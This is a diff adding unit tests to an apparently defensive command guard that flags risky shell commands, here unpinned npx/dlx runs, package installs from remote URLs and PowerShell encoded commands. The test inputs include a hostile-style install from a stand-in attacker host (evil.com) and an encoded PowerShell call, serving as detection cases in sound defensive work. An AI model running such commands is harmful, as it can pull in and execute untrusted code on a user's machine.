@@ -303,6 +303,20 @@ test("guard v3: subdir delete warns; whitelisted build dirs allowed; legit cmds 
   assert.equal(dw("npm run build"), "allow");
 });
 
+// ---- F-06: supply-chain + obfuscation risk -------------------------------
+test("guard: unpinned npx/dlx and remote installs warn; pinned/normal allowed", () => {
+  assert.equal(dw("npx cowsay-evil"), "warn");
+  assert.equal(dw("pnpm dlx create-thing"), "warn");
+  assert.equal(dw("npx cowsay@1.5.0"), "allow");
+  assert.equal(dw("npm install express"), "allow");
+  assert.equal(dw("npm install https://evil.com/x.tgz"), "warn");
+  assert.equal(dw("npm install git+https://github.com/x/y"), "warn");
+});
+test("guard: PowerShell encoded command is high-risk (warn in vibe, block in strict)", () => {
+  assert.equal(dw("powershell -EncodedCommand aGVsbG8="), "warn");
+  assert.equal(classifyCommand("pwsh -enc aGk=", { mode: "strict", projDir: "/w/app" }).decision, "block");
+});
+
 // ---- distribution: self-contained install (P1) ----------------------------
 test("dist: init into an empty project → self-contained + hook runs without tools/", () => {
   const proj = mkdtempSync(join(tmpdir(), "kit-proj-"));
